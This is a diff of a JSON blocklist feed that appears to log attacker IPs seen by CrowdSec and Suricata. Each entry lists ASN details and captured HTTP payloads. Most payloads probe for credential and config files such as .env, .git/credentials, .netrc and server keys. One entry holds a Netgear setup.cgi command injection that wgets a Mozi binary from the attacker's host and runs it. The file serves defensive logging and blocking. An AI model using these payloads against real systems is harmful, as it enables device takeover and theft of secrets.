@@ -1,44 +1,13 @@
 {
-  "generated_at": "2026-10-31T13:00:00Z",
+  "generated_at": "2026-11-01T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 51,
-    "v4": 51,
+    "total": 54,
+    "v4": 54,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "136.70.123.79",
-      "family": "v4",
-      "first_seen": "2026-10-24T22:00:00Z",
-      "last_seen": "2026-10-24T22:00:00Z",
-      "scenarios": [
-        "crowdsec/http-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "396982",
-      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
-      "asn_prefix": "136.70.64.0/18",
-      "tags": [
-        "mwl:cloud=\"gcp\""
-      ],
-      "payloads": [
-        "GET /.git/config",
-        "GET /.git/credentials",
-        "GET /.git-credentials",
-        "GET /.gitconfig",
-        "GET /.netrc",
-        "GET /_netrc",
-        "GET /.npmrc",
-        "GET /.yarnrc",
-        "GET /.composer/auth.json",
-        "GET /composer/auth.json",
-        "GET /.config/gh/hosts.yml"
-      ]
-    },
     {
       "ip": "66.132.224.86",
       "family": "v4",
@@ -1141,6 +1110,9 @@
       "sources": [
         "crowdsec"
       ],
+      "asn": "16509",
+      "asn_name": "AMAZON-02 - Amazon.com, Inc.",
+      "asn_prefix": "3.248.0.0/13",
       "tags": [
         "mwl:cloud=\"aws\""
       ],
@@ -1213,6 +1185,123 @@
       "asn_prefix": "5.181.86.0/24",
       "payloads": [
         "GET /remote/login?lang=en"
+      ]
+    },
+    {
+      "ip": "66.132.195.185",
+      "family": "v4",
+      "first_seen": "2026-11-01T00:00:00Z",
+      "last_seen": "2026-11-01T00:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent",
+        "crowdsec/http-technology-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398324",
+      "asn_name": "CENSYS-ARIN-01 - Censys, Inc.",
+      "asn_prefix": "66.132.195.0/24",
+      "payloads": [
+        "GET /info.php",
+        "GET /"
+      ]
+    },
+    {
+      "ip": "169.40.142.132",
+      "family": "v4",
+      "first_seen": "2026-10-31T21:00:00Z",
+      "last_seen": "2026-10-31T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "215599",
+      "asn_name": "ZKILLU Zkillu SAS",
+      "asn_prefix": "169.40.142.0/24",
+      "payloads": [
+        "GET /",
+        "GET /pathscan-1b60267007c0-nope.env",
+        "GET /pathscan-3909922ded99-nope.env",
+        "GET /.git/config",
+        "GET /.git/HEAD",
+        "GET /.env.txt",
+        "GET /.env.backup",
+        "GET /.env.local",
+        "GET /.env.production",
+        "GET /.env",
+        "GET /.env.save"
+      ]
+    },
+    {
+      "ip": "72.255.19.55",
+      "family": "v4",
+      "first_seen": "2026-10-31T18:00:00Z",
+      "last_seen": "2026-10-31T18:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "9541",
+      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
+      "asn_prefix": "72.255.19.0/24",
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://72.255.19.55:56300/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://72.255.19.55:56300/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "34.48.251.157",
+      "family": "v4",
+      "first_seen": "2026-10-31T13:00:00Z",
+      "last_seen": "2026-10-31T15:00:00Z",
+      "scenarios": [
+        "crowdsec/http-admin-interface-probing",
+        "crowdsec/http-bad-user-agent",
+        "crowdsec/http-crawl-non_statics",
+        "crowdsec/http-dos-swithcing-ua",
+        "crowdsec/http-path-traversal-probing",
+        "crowdsec/http-probing",
+        "crowdsec/http-sensitive-files"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "396982",
+      "asn_name": "GOOGLE-CLOUD-PLATFORM - Google LLC",
+      "asn_prefix": "34.48.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /.s3cfg",
+        "GET /ssl/server.key",
+        "GET /host.key",
+        "GET /serverless.yaml",
+        "GET /config/env/aws_credentials.env",
+        "GET /.env.dev",
+        "GET /configuration.php.bak",
+        "GET /storage/.env",
+        "GET /wp/.env",
+        "GET /.env.php.bak",
+        "GET /",
+        "GET /robots.txt",
+        "GET /sitemap.xml",
+        "GET /sitemap_index.xml",
+        "GET /z9x8c7v6b5-debug-trigger-salledarcade.fr",
+        "GET /qqo316h4envo47bm6h86",
+        "GET /ubgykilajw5i0mgd25vj",
+        "GET /wp-config.php.swp",
+        "GET /wp-config.php~",
+        "POST /graphql"
       ]
     }
   ]
